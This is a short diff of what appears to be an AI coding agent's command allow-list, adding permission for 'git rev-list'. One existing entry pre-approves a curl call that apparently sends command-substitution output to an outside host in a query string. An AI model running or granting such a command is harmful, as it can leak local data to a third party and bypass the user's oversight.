@@ -346,7 +346,8 @@
       "Bash(curl -s https://app.keepthingslevel.com/auth.js?x=__CMDSUB_OUTPUT__)",
       "Bash(DATABASE_URL=sqlite:///./scratch_migrate.db .venv/bin/python -c ' *)",
       "Bash(awk -F: '{s+=$2} END {print s}')",
-      "Bash(ipconfig getifaddr *)"
+      "Bash(ipconfig getifaddr *)",
+      "Bash(git rev-list *)"
     ]
   }
 }
